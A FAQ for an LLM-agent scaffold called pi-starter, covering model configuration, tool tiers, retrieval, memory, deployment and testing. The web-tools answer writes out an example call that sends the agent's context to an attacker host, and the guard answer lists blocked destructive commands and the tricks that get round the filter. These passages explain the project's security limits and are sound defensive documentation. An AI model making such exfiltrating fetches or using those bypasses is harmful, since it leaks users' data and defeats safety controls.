# FAQ

Common questions encountered while setting up, running, and extending pi-starter. Answers are grounded in the actual code paths.

## Setup & configuration

### Why does startup throw with "missing PI_MODEL" instead of falling back to a default?

Because there is deliberately **no third tier of fallback** beyond CLI > `.env`. The SDK's built-in default (`huggingface`) does not match most vertical-agent use cases, and a silently-wrong model is worse than a loud failure at startup. Set `PI_MODEL` in `.env` (or pass `--model` on the CLI) — see the [Quick Start](README.md#quick-start) section.

### Can I put provider + model in one variable?

Yes. `PI_MODEL=modelscope/deepseek-ai/DeepSeek-V4-Flash-0731` (recommended, one variable says it all) or split as `PI_PROVIDER` + `PI_MODEL`. Slashes inside the model id (e.g. `deepseek-ai/…`, `Qwen/…`) are preserved and are **not** reparsed as a provider.

### How do I add a second provider (e.g. zhipu alongside modelscope)?

Use `PI_MODELS`. Format: one entry per provider, fields separated by `|`, models comma-separated, optional `:displayName` per model, entries separated by `;`. Then add the key as `PI_API_KEY_<PROVIDER>` (uppercase):

```bash
PI_MODELS=modelscope|https://api-inference.modelscope.cn/v1|openai-completions|deepseek-ai/DeepSeek-V4-Flash-0731:DeepSeek-V4-Flash;zhipu|https://open.bigmodel.cn/api/paas/v4|openai-completions|glm-4.5-air:GLM-4.5-Air
PI_API_KEY=ms-...
PI_API_KEY_ZHIPU=...
```

Only the default provider's key is mandatory; missing keys on other providers are skipped with a warning.

### Why doesn't my `.env` multi-line `PI_MODELS` work?

dotenv does not support continuation lines. Keep all entries on one physical line.

### Where are my API keys actually stored?

`npm run setup` merges them into `~/.pi/agent/auth.json` (mode `0o600`), and that file is what the SDK authenticates with at runtime — so it is the authoritative copy. Note that `.env` is *also* loaded into the server's own `process.env` (`loadEnvFile`), so `PI_API_KEY` genuinely does sit in the server process; deleting it from `.env` is fine for authentication, but do not expect it to be absent from the process environment. It is deliberately not inherited by child processes: `exec` and MCP spawns get a filtered environment (`src/child-env.ts`), so a `bash` command can no longer read the key.

### `npm run setup` overwrote my existing key. Was that expected?

No — by default setup keeps existing provider keys. Overwrite only happens with `--force`:

```bash
npm run setup -- --force
```

## Runtime & behaviour

### Why is the `read` tool enabled even in the safest tier `off`?

Because the SDK only writes the skill catalog (`<available_skills>` with `<location>`) into the system prompt when `selectedTools` includes `read`, and skills are loaded by having the model `read` the SKILL.md at `<location>`. Disabling `read` would silently break skills. `off` still leaves `bash` / `edit` / `write` off.

### `POST /chat` returned 429. What happened?

One process = one agent session, and the scaffold guards concurrent prompts with a busy flag to avoid interleaved state. Finish the current stream (wait for `event: done` or `event: error`) before sending the next message. For real multi-user workloads, build one `buildAgent()` per user and manage sessions yourself.

### Why isn't a tool I registered inside an extension being called?

Extensions can `pi.registerTool(...)`, but the built-in-tool allowlist only knows about names present in `src/tools/index.ts` or `buildAgent({ extraTools })`. Register the tool through the standard path if you want `readonly` / `coding` tiers to allowlist it.

### Does `guard` sandbox bash?

No. `guard` is regex-based pre-execution interception (see `src/extensions/guard.ts`); it stops `rm -rf`, `mkfs`, `dd of=`, fork bombs, shutdown/reboot, Windows destructive commands, and paths escaping cwd — but it is bypassable by command substitution, encoded payloads, symlinks, and other indirect tricks. For real isolation, run the whole thing in a container — a ready `Dockerfile` is in the repo root; publish its port to loopback only (`-p 127.0.0.1:3000:3000`).

### `~/.pi/agent/skills` on my machine is being ignored. Is that a bug?

It's intentional. The scaffold sets `noSkills: true` and `noExtensions: true` so unrelated user-level skills and extensions cannot leak into a vertical agent. Only repo-bundled skills (`src/skills/`) and any paths you pass via `buildAgent({ extraSkillPaths })` / `{ extraExtensions }` are loaded.

### How do I enable local / vector RAG over the knowledge base?

Retrieval is pluggable behind the `Retriever` interface. Default is in-process keyword search (zero-dependency, unchanged behavior). Set `PI_KNOWLEDGE_RETRIEVAL=vector` and pick an embedding source via `PI_EMBEDDINGS_PROVIDER`:

- `transformers` — **in-process** via `@huggingface/transformers` (an `optionalDependency`); first use auto-downloads ONNX weights to `PI_EMBEDDINGS_CACHE_DIR`; no external server. Set `PI_EMBEDDINGS_HF_ENDPOINT=hf-mirror.com` if huggingface.co is unreachable.
- `openai` / `ollama` — point `PI_EMBEDDINGS_BASE_URL` + `PI_EMBEDDINGS_MODEL` at any OpenAI-compatible `/v1/embeddings` (Ollama's `/v1` works too).

Store vectors in memory (default) or persist with `PI_KNOWLEDGE_VECTOR_STORE=sqlite` + `PI_KNOWLEDGE_VECTOR_DB_PATH` (content-hashed chunk ids so restarts skip re-embedding). Verify with `npm run rag:smoke` (prints `SKIP` when offline). For a real vector DB (Qdrant/pgvector), implement `VectorStore` and pass `buildAgent({ vectorStore })` — the `search_knowledge` tool and model side stay unchanged.

### Where does cross-session memory live, and can I keep it out of the picture?

`remember` / `recall` write JSONL to `~/.pi/agent/pi-starter-memory.jsonl` (override the path with the store's `filePath`). It is **on by default**, because "remember me" is otherwise impossible across conversations. The file and its directory are created `0600` / `0700` — same policy as `auth.json` and the provider-key store — and repeated writes of the *same* text overwrite the entry rather than duplicating it (models re-state facts). Bounds: 4 KB per entry, 2000 entries (oldest evicted and reported honestly), 4 MB file cap.

Turn it off with `PI_MEMORY=off` (or `buildAgent({ memory: false })`): both tools disappear from the tool list *and* from the capability catalog, and `GET/POST/DELETE /memory` is not mounted. It is deliberately **not** the knowledge base: knowledge is read-only, ships in the repo, and only its catalog goes into the system prompt; memory is writable, per-machine, and is fetched on demand via `recall`.

### The agent has no web tools by default — isn't that a gap?

It is a choice, and it is opt-in: `PI_WEB=on` registers `web_fetch` (`web_search` additionally requires an injected search backend via `buildAgent({ webClient })`). Outbound network is an exfiltration channel — `web_fetch("https://attacker.example/?d=<anything in the context>")` leaks whatever the model can see — and this server has no authentication, so the default is off, exactly like the coding tier is off by default.

What is defended when you turn it on: http/https only; loopback / private / link-local / multicast / CGNAT and IPv4-mapped addresses refused, **including when a hostname resolves to one**; redirects are followed one hop at a time with the host check re-run **before each hop is requested**, so a `302` to an internal address never results in a request being sent there. What is *not* defended: the model picks the URL, and the DNS check has a resolve-then-connect window (rebinding). See `SECURITY.md` for the honest boundary.

## Model switching

### CLI: how do I switch mid-session?

```
/models                    # list available
/model <provider>/<id>     # switch
```

Slash commands are handled by the CLI and are not sent to the model.

### HTTP: how do I switch without rebuilding the session?

`POST /model` with `{ "model": "provider/modelId" }`. It calls `session.setModel` internally. Only models with a configured key can be switched to.

## Deployment

### Is the server safe to expose to the internet?

No — see [SECURITY.md](SECURITY.md). It has no auth and no rate limiting by default, and binds `127.0.0.1` only (set `PI_HOST` to widen that; startup warns). Put a reverse proxy with authentication in front, or use `createApp({ agent, staticDir: false })` and mount `app` onto your existing authenticated Express app — the auth must sit on the **parent** app, since middleware added after `createApp()` does not run before the kernel routes. Details in [docs/嵌入指南.md](docs/嵌入指南.md).

### Can I embed `createApp` into an existing Express?

Yes.

```ts
const { app, dispose } = createApp({ agent, staticDir: false });
existingExpressApp.use("/agent", app);
```

Turn off `staticDir` so the bundled `web/` frontend build is not mounted, and remember to call `dispose()` on shutdown to release the SQLite handle.

### The DB is in-memory. How do I use a real file?

Set `PI_DATABASE_PATH=./data/app.db` or pass `buildAgent({ databasePath: "./data/app.db" })`. For anything other than SQLite, implement `DatabaseStore` and pass `buildAgent({ database: myStore })` — HTTP and tools depend only on that interface.

## Development

### Node says `node:sqlite` is unavailable.

`node:sqlite` landed in Node 22. `package.json` `engines.node` is set to `>=22.19`. Upgrade Node; there is no polyfill and no `better-sqlite3` fallback.

### Tests try to hit the network.

They shouldn't. The `*.test.ts` files are contract smoke tests that build agents without calling models and never write to the real `~/.pi/agent/`. If a test is reaching the network, that's a bug — open an issue.

### How do I ship my own custom tool with the scaffold-as-library?

```ts
import { buildAgent } from "pi-starter";
import { myTool } from "./my-tool";

const agent = await buildAgent({ extraTools: [myTool] });
```

Then in the tier you run under (`readonly` / `coding`), `myTool`'s name is merged into the SDK allowlist automatically.

### `npm run verify:audit` says "could not execute" — is that a vulnerability or nothing?

Neither, and the distinction is the point. The audit gate keeps three outcomes apart: **pass**, **advisories found** (exit 1), and **could not execute** (exit 2 — `npm` itself did not run). Collapsing the third into either of the others has already happened here twice: a bare `catch` turned a Windows spawn failure into a permanent red, and the `--tolerate-network` variant turned the same failure into a silent green while printing "skipped". An "unavailable" verdict therefore never exits 0, and the message names the cause (`scripts/npm-invocation.mjs` probes `npm --version` through the exact same invocation path the audit will use, so pre-flight and work can never disagree).

### Some tests skip on Windows. Is the suite actually green there?

Yes — `npm run verify` passes on Windows, and every skip is printed with its reason rather than passed off as a success. Three families are POSIX-only by nature:

- **File modes** — Windows `chmod` can only set the read-only bit, so `0600` and `0644` are indistinguishable in `stat.mode` (measured: always `0o666`). Affects `setup` (`.env` / `auth.json`), the SQLite vector store, and the memory file.
- **File symlinks** — need developer mode or privileges, and a junction (which any user can create) only works for directories, so it cannot express "harmless link name → real target is `.env`". Affects `guard` and the file service's `denyNames` tests.
- **Real `SIGTERM`** — `child.kill` on Windows goes through `TerminateProcess`, so the signal path is unobservable; the shutdown *orchestration* was extracted into `src/graceful.ts` and is covered on every platform instead of being left unwatched.

The remote pipelines run in a Linux container, so a Windows-only failure would never be seen by CI. That asymmetry is why new gates are always run locally before being called green, and why `verify` includes `verify:audit` at all.

### Do the tests clean up after themselves?

They now have to: temp directories come from `tempDir()` (`src/test-tmp.ts`), which registers removal on process exit and **reports** anything it could not delete instead of swallowing the error. Before that, 111 bare `mkdtempSync` calls left 8.5k directories (~165 MB) in the system temp folder, and every full test run added another layer.

## Meta

### Why is the model tier `off` the default?

pi-starter is a **vertical-agent scaffold**, not a coding assistant. Coding tools are opt-in because they change the trust profile of the whole process (disk writes, shell execution).

### Which upstream SDK does this target?

`@earendil-works/pi-agent-core`, `@earendil-works/pi-ai`, `@earendil-works/pi-coding-agent` — pinned in `package.json`. See [the pi repository](https://github.com/earendil-works/pi) for the underlying event menu, tool contract, and extension API.
